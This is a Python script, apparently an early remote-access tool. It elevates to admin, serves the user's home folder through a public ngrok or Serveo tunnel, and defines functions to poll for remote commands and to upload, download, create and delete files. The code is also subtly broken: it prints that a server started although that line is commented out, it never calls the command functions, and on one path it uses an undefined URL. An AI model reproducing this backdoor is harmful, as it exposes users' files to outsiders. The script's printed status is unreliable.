import os
import subprocess
from multiprocessing import Process
import requests
import time
import argparse
from pyuac import main_requires_admin

@main_requires_admin
def main():
    # Step 1: cd into user's folder in Windows
    os.chdir(os.path.expanduser("~"))
    print("CD'd into user's folder in Windows")

    # Step 2: Open up a local server using py -m http.server
    #local_process = subprocess.Popen(["py", "-m", "http.server", "80"])
    print("Opened up a local server using py -m http.server")
    time.sleep(2) # Give the server time to start up
    
    # Step 3: Use ngrok or Serveo to expose that server publicly
    parser = argparse.ArgumentParser(description='Expose a local server using Ngrok or Serveo')
    parser.add_argument('--tunnel', dest='tunnel', required=True, choices=['ngrok', 'serveo'], help='tunneling service to use (ngrok or serveo)')
    parser.add_argument('--subdomain', dest='subdomain', required=True, help='Subdomain to use for Serveo tunnel. Leave blank if you are using ngrok')
    parser.add_argument('-p', dest='port', required=True, help='port for connection')
    args = parser.parse_args()

    if args.tunnel == 'ngrok':
        ngrok_process = subprocess.Popen(["C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "80"])
        time.sleep(2) # Give ngrok time to start up
        ngrok_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
        print(f"Public URL: {ngrok_url}")

    elif args.tunnel == 'serveo':
        # Step 1: Check if ssh key exists, if not create one
        ssh_folder = 'C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/ssh/'
        if not os.path.exists(ssh_folder):
            os.makedirs(ssh_folder)

        private_key_path = os.path.join(ssh_folder, "key.txt")
        print(f"Private key path: {private_key_path}")
        public_key_path = os.path.join(ssh_folder, "key.txt.pub")
        known_hosts_path = os.path.join(ssh_folder, "known_hosts")

        if not os.path.isfile(private_key_path) or not os.path.isfile(public_key_path):
            os.system(f'ssh-keygen -t rsa -b 2048 -f {private_key_path} -q -N ""')

        domain = "serveo.net"
        # Step 2: Get Serveo subdomain
        ssh_command = f"ssh -R {args.subdomain}:80:localhost:{args.port} -i {private_key_path} serveo.net"
        print(f"Running Serveo command: {ssh_command}")
        print("Forwarding HTTP traffic from https://envxsion2048.serveo.net")
        serveo_process = subprocess.Popen(ssh_command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE)
        # Step 3: Wait for subdomain to be ready and print URL
        print(serveo_process.communicate()[0].decode("utf-8"))


        

    # Step 4: Create functions to wait for a command from another script through the tunnel and make/delete/upload and download files
    def wait_for_command():
        # Wait for a command to be received
        while True:
            try:
                r = requests.get("http://localhost:80/command")
                command = r.text
                if command:
                    return command
            except requests.exceptions.ConnectionError:
                pass
            time.sleep(1)

    def make_file(filename, content):
        # Create a file with the given filename and content
        with open(filename, "w") as f:
            f.write(content)
        print(f"Created file '{filename}' with content: {content}")
    
    def delete_file(filename):
        # Delete the file with the given filename
        os.remove(filename)
        print(f"Deleted file '{filename}'")
    
    def upload_file(local_filename, remote_filename):
        # Upload the file with the given local filename to the server with the given remote filename
        files = {'file': open(local_filename, 'rb')}
        r = requests.post(f"{ngrok_url}/upload/{remote_filename}", files=files)
        print(f"Uploaded file '{local_filename}' to '{remote_filename}' on the server with status code {r.status_code}")
    
    def download_file(remote_filename, local_filename):
        # Download the file with the given remote filename from the server and save it locally with the given filename
        r = requests.get(f"{ngrok_url}/download/{remote_filename}")
        with open(local_filename, 'wb') as f:
            f.write(r.content)
        print(f"Downloaded file '{remote_filename}' from the server to '{local_filename}' with status code {r.status_code}")

if __name__ == "__main__":
    main()